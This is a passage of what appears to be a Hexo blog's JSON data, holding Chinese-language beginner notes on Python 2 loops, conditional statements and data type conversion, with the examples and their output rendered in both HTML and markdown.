class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\">count = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">while</span> count &lt; <span class=\"number\">9</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'The count is :'</span>, count</div><div class=\"line\">    count = count + <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Good bye!\"</span></div></pre></td></tr></table></figure>","more":"<h3 id=\"3-输出结果\"><a href=\"#3-输出结果\" class=\"headerlink\" title=\"3. 输出结果\"></a>3. 输出结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:loop yeshaoting$ python while.py</div><div class=\"line\">The count is : 0</div><div class=\"line\">The count is : 1</div><div class=\"line\">The count is : 2</div><div class=\"line\">The count is : 3</div><div class=\"line\">The count is : 4</div><div class=\"line\">The count is : 5</div><div class=\"line\">The count is : 6</div><div class=\"line\">The count is : 7</div><div class=\"line\">The count is : 8</div><div class=\"line\">Good <span class=\"built_in\">bye</span>!</div></pre></td></tr></table></figure>\n<h2 id=\"三、for循环\"><a href=\"#三、for循环\" class=\"headerlink\" title=\"三、for循环\"></a>三、for循环</h2><p>Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p>\n<h3 id=\"1-语法格式-1\"><a href=\"#1-语法格式-1\" class=\"headerlink\" title=\"1. 语法格式\"></a>1. 语法格式</h3><blockquote>\n<p>for iterating_var in sequence:<br>   statements(s)</p>\n</blockquote>\n<h3 id=\"2-实例-1\"><a href=\"#2-实例-1\" class=\"headerlink\" title=\"2. 实例\"></a>2. 实例</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\">string = <span class=\"string\">'Python'</span></div><div class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> string:</div><div class=\"line\">    <span class=\"keyword\">print</span> letter;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> range(len(string)):</div><div class=\"line\">    <span class=\"keyword\">print</span> letter;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">fruits = [<span class=\"string\">'apple'</span>, <span class=\"string\">'mango'</span>, <span class=\"string\">'banana'</span>]</div><div class=\"line\"><span class=\"keyword\">for</span> fruit <span class=\"keyword\">in</span> fruits:</div><div class=\"line\">    <span class=\"keyword\">print</span> fruit;</div></pre></td></tr></table></figure>\n<h3 id=\"3-扩展知识\"><a href=\"#3-扩展知识\" class=\"headerlink\" title=\"3. 扩展知识\"></a>3. 扩展知识</h3><h4 id=\"内置函数len\"><a href=\"#内置函数len\" class=\"headerlink\" title=\"内置函数len\"></a>内置函数len</h4><p>返回序列(string, bytes, tuple, list, range)长度。</p>\n<blockquote>\n<p>Return the length (the number of items) of an object. The argument may be a sequence (such as a string, bytes, tuple, list, or range) or a collection (such as a dictionary, set, or frozen set).</p>\n</blockquote>\n<h4 id=\"内置函数range\"><a href=\"#内置函数range\" class=\"headerlink\" title=\"内置函数range\"></a>内置函数range</h4><p>range返回一个序列的数。</p>\n<p>有两种用法：<br>range(stop)<br>range(start, stop[, step])</p>\n<h3 id=\"4-输出结果\"><a href=\"#4-输出结果\" class=\"headerlink\" title=\"4. 输出结果\"></a>4. 输出结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:loop yeshaoting$ python for.py</div><div class=\"line\">P</div><div class=\"line\">y</div><div class=\"line\">t</div><div class=\"line\">h</div><div class=\"line\">o</div><div class=\"line\">n</div><div class=\"line\">0</div><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">apple</div><div class=\"line\">mango</div><div class=\"line\">banana</div></pre></td></tr></table></figure>\n<h2 id=\"四、嵌套循环\"><a href=\"#四、嵌套循环\" class=\"headerlink\" title=\"四、嵌套循环\"></a>四、嵌套循环</h2><p>Python 语言允许在一个循环体里面嵌入另一个循环。</p>\n<h2 id=\"五、循环控制\"><a href=\"#五、循环控制\" class=\"headerlink\" title=\"五、循环控制\"></a>五、循环控制</h2><p>break语句用来终止循环语句，即循环条件没有False条件或者序列还没被完全递归完，也会停止执行循环语句。<br>continue 语句用来告诉Python跳过当前循环的剩余语句，然后继续进行下一轮循环。<br>pass 不做任何事情，一般用做占位语句。</p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ul>\n<li><a href=\"http://www.runoob.com//python/python-loops.html\">Python 循环语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-while-loop.html\">Python While循环语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-for-loop.html\">Python for 循环语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-nested-loops.html\">Python 循环嵌套</a></li>\n<li><a href=\"http://www.runoob.com//python/python-break-statement.html\">Python break 语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-continue-statement.html\">Python continue  语句</a></li>\n<li><a href=\"http://www.runoob.com//python/python-pass-statement.html\">Python pass 语句</a></li>\n</ul>"},{"title":"Python菜鸟教程学习笔记 - 条件语句","date":"2016-05-02T08:31:00.000Z","_content":"\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\npython里的真为True，假为False，空为None.\nPython程序语言指定任何非0和非空（None）条件判断结果为True，0 或者None条件判断结果为False。\n\n\n## 二、条件判断形式\n条件判断形式为：\n``` python\nif 判断条件1:\n    执行语句1……\nelif 判断条件2:\n    执行语句2……\nelif 判断条件3:\n    执行语句3……\nelse:\n    执行语句4……\n```\n\n**注**：别忘了if, elif, else关键字开头行尾的冒号。\n\n<!-- more -->\n\n\n## 三、实例\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\nvalue=raw_input(\"请输入100以内分数：\");\n\nscore=int(value);\nif score > 90:\n    print '优秀'\nelif score > 80:\n    print '良好'\nelif score > 70:\n    print '中等'\nelif score > 60:\n    print '及格'\nelse:\n    print '不及格'\n```\n\n结果输出：\n``` python\n请输入100以内分数：20\n不及格\n\n请输入100以内分数：89\n良好\n```\n\n\n## 四、补充\n由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。\n\n\n## 五、参考文档\n[Python 条件语句](http://www.runoob.com/python/python-if-statement.html)\n\n","source":"_posts/article/python/python学习笔记-条件语句.md","raw":"title: Python菜鸟教程学习笔记 - 条件语句\ntags:\n  - python\n  - 学习笔记\ncategories:\n  - 系统脚本\ndate: 2016-05-02 16:31:00\n---\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\npython里的真为True，假为False，空为None.\nPython程序语言指定任何非0和非空（None）条件判断结果为True，0 或者None条件判断结果为False。\n\n\n## 二、条件判断形式\n条件判断形式为：\n``` python\nif 判断条件1:\n    执行语句1……\nelif 判断条件2:\n    执行语句2……\nelif 判断条件3:\n    执行语句3……\nelse:\n    执行语句4……\n```\n\n**注**：别忘了if, elif, else关键字开头行尾的冒号。\n\n<!-- more -->\n\n\n## 三、实例\n``` python\n#!/usr/bin/env python\n#coding=utf8\n\nvalue=raw_input(\"请输入100以内分数：\");\n\nscore=int(value);\nif score > 90:\n    print '优秀'\nelif score > 80:\n    print '良好'\nelif score > 70:\n    print '中等'\nelif score > 60:\n    print '及格'\nelse:\n    print '不及格'\n```\n\n结果输出：\n``` python\n请输入100以内分数：20\n不及格\n\n请输入100以内分数：89\n良好\n```\n\n\n## 四、补充\n由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。\n\n\n## 五、参考文档\n[Python 条件语句](http://www.runoob.com/python/python-if-statement.html)\n\n","slug":"article/python/python学习笔记-条件语句","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxuu00725nbt9aidtanz","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>python里的真为True，假为False，空为None.<br>Python程序语言指定任何非0和非空（None）条件判断结果为True，0 或者None条件判断结果为False。</p>\n<h2 id=\"二、条件判断形式\"><a href=\"#二、条件判断形式\" class=\"headerlink\" title=\"二、条件判断形式\"></a>二、条件判断形式</h2><p>条件判断形式为：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> 判断条件<span class=\"number\">1</span>:</div><div class=\"line\">    执行语句<span class=\"number\">1</span>……</div><div class=\"line\"><span class=\"keyword\">elif</span> 判断条件<span class=\"number\">2</span>:</div><div class=\"line\">    执行语句<span class=\"number\">2</span>……</div><div class=\"line\"><span class=\"keyword\">elif</span> 判断条件<span class=\"number\">3</span>:</div><div class=\"line\">    执行语句<span class=\"number\">3</span>……</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    执行语句<span class=\"number\">4</span>……</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：别忘了if, elif, else关键字开头行尾的冒号。</p>\n<a id=\"more\"></a>\n<h2 id=\"三、实例\"><a href=\"#三、实例\" class=\"headerlink\" title=\"三、实例\"></a>三、实例</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\">value=raw_input(<span class=\"string\">\"请输入100以内分数：\"</span>);</div><div class=\"line\"></div><div class=\"line\">score=int(value);</div><div class=\"line\"><span class=\"keyword\">if</span> score &gt; <span class=\"number\">90</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'优秀'</span></div><div class=\"line\"><span class=\"keyword\">elif</span> score &gt; <span class=\"number\">80</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'良好'</span></div><div class=\"line\"><span class=\"keyword\">elif</span> score &gt; <span class=\"number\">70</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'中等'</span></div><div class=\"line\"><span class=\"keyword\">elif</span> score &gt; <span class=\"number\">60</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'及格'</span></div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'不及格'</span></div></pre></td></tr></table></figure>\n<p>结果输出：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">请输入<span class=\"number\">100</span>以内分数：<span class=\"number\">20</span></div><div class=\"line\">不及格</div><div class=\"line\"></div><div class=\"line\">请输入<span class=\"number\">100</span>以内分数：<span class=\"number\">89</span></div><div class=\"line\">良好</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、补充\"><a href=\"#四、补充\" class=\"headerlink\" title=\"四、补充\"></a>四、补充</h2><p>由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><p><a href=\"http://www.runoob.com/python/python-if-statement.html\" target=\"_blank\" rel=\"external\">Python 条件语句</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>python里的真为True，假为False，空为None.<br>Python程序语言指定任何非0和非空（None）条件判断结果为True，0 或者None条件判断结果为False。</p>\n<h2 id=\"二、条件判断形式\"><a href=\"#二、条件判断形式\" class=\"headerlink\" title=\"二、条件判断形式\"></a>二、条件判断形式</h2><p>条件判断形式为：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> 判断条件<span class=\"number\">1</span>:</div><div class=\"line\">    执行语句<span class=\"number\">1</span>……</div><div class=\"line\"><span class=\"keyword\">elif</span> 判断条件<span class=\"number\">2</span>:</div><div class=\"line\">    执行语句<span class=\"number\">2</span>……</div><div class=\"line\"><span class=\"keyword\">elif</span> 判断条件<span class=\"number\">3</span>:</div><div class=\"line\">    执行语句<span class=\"number\">3</span>……</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    执行语句<span class=\"number\">4</span>……</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：别忘了if, elif, else关键字开头行尾的冒号。</p>","more":"<h2 id=\"三、实例\"><a href=\"#三、实例\" class=\"headerlink\" title=\"三、实例\"></a>三、实例</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\">#coding=utf8</span></div><div class=\"line\"></div><div class=\"line\">value=raw_input(<span class=\"string\">\"请输入100以内分数：\"</span>);</div><div class=\"line\"></div><div class=\"line\">score=int(value);</div><div class=\"line\"><span class=\"keyword\">if</span> score &gt; <span class=\"number\">90</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'优秀'</span></div><div class=\"line\"><span class=\"keyword\">elif</span> score &gt; <span class=\"number\">80</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'良好'</span></div><div class=\"line\"><span class=\"keyword\">elif</span> score &gt; <span class=\"number\">70</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'中等'</span></div><div class=\"line\"><span class=\"keyword\">elif</span> score &gt; <span class=\"number\">60</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'及格'</span></div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'不及格'</span></div></pre></td></tr></table></figure>\n<p>结果输出：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">请输入<span class=\"number\">100</span>以内分数：<span class=\"number\">20</span></div><div class=\"line\">不及格</div><div class=\"line\"></div><div class=\"line\">请输入<span class=\"number\">100</span>以内分数：<span class=\"number\">89</span></div><div class=\"line\">良好</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、补充\"><a href=\"#四、补充\" class=\"headerlink\" title=\"四、补充\"></a>四、补充</h2><p>由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><p><a href=\"http://www.runoob.com/python/python-if-statement.html\">Python 条件语句</a></p>"},{"title":"Python菜鸟教程学习笔记 - 数据类型","date":"2016-05-02T07:13:00.000Z","_content":"\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、标准数据类型\nPython有五个标准的数据类型：\n- Numbers（数字）\n- String（字符串）\n- List（列表）\n- Tuple（元组）\n- Dictionary（字典）\n\n\n## 二、数字\nPython支持四种不同的数字类型：\n- int（有符号整型）\n- long（长整型[也可以代表八进制和十六进制]）\n- float（浮点型）\n- complex（复数）\n\n长整型定义在数值后添加一个小写或者大写的\"L\"，python中没有double类型数字。\n\n使用完一个对象后，可通过del关键字删除对象引用。语法：\ndel var1[,var2[,var3[....,varN]]]]\n``` python\nvalue = 25\nstring = \"yes\"\ndel value, string\n```\n\n如若在删除对象引用还继续使用对象的话，则会报变量未定义的错误：`NameError: name 'value' is not defined`\n\n\n<!-- more -->\n\n## 三、字符串\n\n\n## 四、列表\n\n\n## 五、元组\n\n\n## 六、字典\n\n\n## 七、数据类型转换\n| 函数 | 描述 |\n|---|---|\n| int(x [,base ])        | 将x转换为一个整数 |\n| long(x [,base ])       | 将x转换为一个长整数 |\n| float(x )              | 将x转换到一个浮点数 |\n| complex(real [,imag ]) | 创建一个复数 |\n| str(x)                | 将对象 x 转换为字符串 |\n| repr(x)               | 将对象 x 转换为表达式字符串 |\n| eval(str)             | 用来计算在字符串中的有效Python表达式,并返回一个对象 |\n| tuple(s)              | 将序列 s 转换为一个元组 |\n| list(s)               | 将序列 s 转换为一个列表 |\n| chr(x)                | 将一个整数转换为一个字符 |\n| unichr(x)             | 将一个整数转换为Unicode字符 |\n| ord(x)                | 将一个字符转换为它的整数值 |\n| hex(x)                | 将一个整数转换为一个十六进制字符串 |\n| oct(x)                | 将一个整数转换为一个八进制字符串 |\n\n对于数值转换而言，如果字面量不是一个整数，会报错：`ValueError: invalid literal for int() with base 10: '1s`\n正确实例：\n``` python\n>>> a=\"12\"; long(a);\n12L\n>>> a=\"12\"; int(a);\n12\n>>> a=\"12\"; float(a);\n12.0\n```\n\n对于元组，列表转换而言，如果字面量不可迭代，会报错：`TypeError: 'int' object is not iterable`\n正确实例：\n``` python\n>>> a='12'; list(a);\n['1', '2']\n>>> a='12'; tuple(a);\n('1', '2')\n```\n\n\n## 八、参考文档\n- [Python 变量类型](http://www.runoob.com/python/python-variable-types.html)\n- [Python Number(数字)](http://www.runoob.com//python/python-numbers.html)\n- [Python 字符串](http://www.runoob.com//python/python-strings.html)\n- [Python 列表(List)](http://www.runoob.com//python/python-lists.html)\n- [Python 元组](http://www.runoob.com//python/python-tuples.html)\n- [Python 字典(Dictionary)](http://www.runoob.com//python/python-dictionary.html)\n","source":"_posts/article/python/python学习笔记-变量类型.md","raw":"title: Python菜鸟教程学习笔记 - 数据类型\ntags:\n  - python\n  - 学习笔记\ncategories:\n  - 系统脚本\ndate: 2016-05-02 15:13:00\n---\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、标准数据类型\nPython有五个标准的数据类型：\n- Numbers（数字）\n- String（字符串）\n- List（列表）\n- Tuple（元组）\n- Dictionary（字典）\n\n\n## 二、数字\nPython支持四种不同的数字类型：\n- int（有符号整型）\n- long（长整型[也可以代表八进制和十六进制]）\n- float（浮点型）\n- complex（复数）\n\n长整型定义在数值后添加一个小写或者大写的\"L\"，python中没有double类型数字。\n\n使用完一个对象后，可通过del关键字删除对象引用。语法：\ndel var1[,var2[,var3[....,varN]]]]\n``` python\nvalue = 25\nstring = \"yes\"\ndel value, string\n```\n\n如若在删除对象引用还继续使用对象的话，则会报变量未定义的错误：`NameError: name 'value' is not defined`\n\n\n<!-- more -->\n\n## 三、字符串\n\n\n## 四、列表\n\n\n## 五、元组\n\n\n## 六、字典\n\n\n## 七、数据类型转换\n| 函数 | 描述 |\n|---|---|\n| int(x [,base ])        | 将x转换为一个整数 |\n| long(x [,base ])       | 将x转换为一个长整数 |\n| float(x )              | 将x转换到一个浮点数 |\n| complex(real [,imag ]) | 创建一个复数 |\n| str(x)                | 将对象 x 转换为字符串 |\n| repr(x)               | 将对象 x 转换为表达式字符串 |\n| eval(str)             | 用来计算在字符串中的有效Python表达式,并返回一个对象 |\n| tuple(s)              | 将序列 s 转换为一个元组 |\n| list(s)               | 将序列 s 转换为一个列表 |\n| chr(x)                | 将一个整数转换为一个字符 |\n| unichr(x)             | 将一个整数转换为Unicode字符 |\n| ord(x)                | 将一个字符转换为它的整数值 |\n| hex(x)                | 将一个整数转换为一个十六进制字符串 |\n| oct(x)                | 将一个整数转换为一个八进制字符串 |\n\n对于数值转换而言，如果字面量不是一个整数，会报错：`ValueError: invalid literal for int() with base 10: '1s`\n正确实例：\n``` python\n>>> a=\"12\"; long(a);\n12L\n>>> a=\"12\"; int(a);\n12\n>>> a=\"12\"; float(a);\n12.0\n```\n\n对于元组，列表转换而言，如果字面量不可迭代，会报错：`TypeError: 'int' object is not iterable`\n正确实例：\n``` python\n>>> a='12'; list(a);\n['1', '2']\n>>> a='12'; tuple(a);\n('1', '2')\n```\n\n\n## 八、参考文档\n- [Python 变量类型](http://www.runoob.com/python/python-variable-types.html)\n- [Python Number(数字)](http://www.runoob.com//python/python-numbers.html)\n- [Python 字符串](http://www.runoob.com//python/python-strings.html)\n- [Python 列表(List)](http://www.runoob.com//python/python-lists.html)\n- [Python 元组](http://www.runoob.com//python/python-tuples.html)\n- [Python 字典(Dictionary)](http://www.runoob.com//python/python-dictionary.html)\n","slug":"article/python/python学习笔记-变量类型","published":1,"updated":"2016-08-20T08:21:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxuw00745nbtw6isgdp0","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、标准数据类型\"><a href=\"#一、标准数据类型\" class=\"headerlink\" title=\"一、标准数据类型\"></a>一、标准数据类型</h2><p>Python有五个标准的数据类型：</p>\n<ul>\n<li>Numbers（数字）</li>\n<li>String（字符串）</li>\n<li>List（列表）</li>\n<li>Tuple（元组）</li>\n<li>Dictionary（字典）</li>\n</ul>\n<h2 id=\"二、数字\"><a href=\"#二、数字\" class=\"headerlink\" title=\"二、数字\"></a>二、数字</h2><p>Python支持四种不同的数字类型：</p>\n<ul>\n<li>int（有符号整型）</li>\n<li>long（长整型[也可以代表八进制和十六进制]）</li>\n<li>float（浮点型）</li>\n<li>complex（复数）</li>\n</ul>\n<p>长整型定义在数值后添加一个小写或者大写的”L”，python中没有double类型数字。</p>\n<p>使用完一个对象后，可通过del关键字删除对象引用。语法：<br>del var1[,var2[,var3[….,varN]]]]<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">value = <span class=\"number\">25</span></div><div class=\"line\">string = <span class=\"string\">\"yes\"</span></div><div class=\"line\"><span class=\"keyword\">del</span> value, string</div></pre></td></tr></table></figure></p>\n<p>如若在删除对象引用还继续使用对象的话，则会报变量未定义的错误：<code>NameError: name &#39;value&#39; is not defined</code></p>\n<a id=\"more\"></a>\n<h2 id=\"三、字符串\"><a href=\"#三、字符串\" class=\"headerlink\" title=\"三、字符串\"></a>三、字符串</h2><h2 id=\"四、列表\"><a href=\"#四、列表\" class=\"headerlink\" title=\"四、列表\"></a>四、列表</h2><h2 id=\"五、元组\"><a href=\"#五、元组\" class=\"headerlink\" title=\"五、元组\"></a>五、元组</h2><h2 id=\"六、字典\"><a href=\"#六、字典\" class=\"headerlink\" title=\"六、字典\"></a>六、字典</h2><h2 id=\"七、数据类型转换\"><a href=\"#七、数据类型转换\" class=\"headerlink\" title=\"七、数据类型转换\"></a>七、数据类型转换</h2><table>\n<thead>\n<tr>\n<th>函数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>int(x [,base ])</td>\n<td>将x转换为一个整数</td>\n</tr>\n<tr>\n<td>long(x [,base ])</td>\n<td>将x转换为一个长整数</td>\n</tr>\n<tr>\n<td>float(x )</td>\n<td>将x转换到一个浮点数</td>\n</tr>\n<tr>\n<td>complex(real [,imag ])</td>\n<td>创建一个复数</td>\n</tr>\n<tr>\n<td>str(x)</td>\n<td>将对象 x 转换为字符串</td>\n</tr>\n<tr>\n<td>repr(x)</td>\n<td>将对象 x 转换为表达式字符串</td>\n</tr>\n<tr>\n<td>eval(str)</td>\n<td>用来计算在字符串中的有效Python表达式,并返回一个对象</td>\n</tr>\n<tr>\n<td>tuple(s)</td>\n<td>将序列 s 转换为一个元组</td>\n</tr>\n<tr>\n<td>list(s)</td>\n<td>将序列 s 转换为一个列表</td>\n</tr>\n<tr>\n<td>chr(x)</td>\n<td>将一个整数转换为一个字符</td>\n</tr>\n<tr>\n<td>unichr(x)</td>\n<td>将一个整数转换为Unicode字符</td>\n</tr>\n<tr>\n<td>ord(x)</td>\n<td>将一个字符转换为它的整数值</td>\n</tr>\n<tr>\n<td>hex(x)</td>\n<td>将一个整数转换为一个十六进制字符串</td>\n</tr>\n<tr>\n<td>oct(x)</td>\n<td>将一个整数转换为一个八进制字符串</td>\n</tr>\n</tbody>\n</table>\n<p>对于数值转换而言，如果字面量不是一个整数，会报错：<code>ValueError: invalid literal for int() with base 10: &#39;1s</code><br>正确实例：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">\"12\"</span>; long(a);</div><div class=\"line\"><span class=\"number\">12L</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">\"12\"</span>; int(a);</div><div class=\"line\"><span class=\"number\">12</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">\"12\"</span>; float(a);</div><div class=\"line\"><span class=\"number\">12.0</span></div></pre></td></tr></table></figure></p>\n<p>对于元组，列表转换而言，如果字面量不可迭代，会报错：<code>TypeError: &#39;int&#39; object is not iterable</code><br>正确实例：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">'12'</span>; list(a);</div><div class=\"line\">[<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>]</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a=<span class=\"string\">'12'</span>; tuple(a);</div><div class=\"line\">(<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>)</div></pre></td></tr></table></figure></p>\n<h2 id=\"八、参考文档\"><a href=\"#八、参考文档\" class=\"headerlink\" title=\"八、参考文档\"></a>八、参考文档</h2><ul>\n<li><a 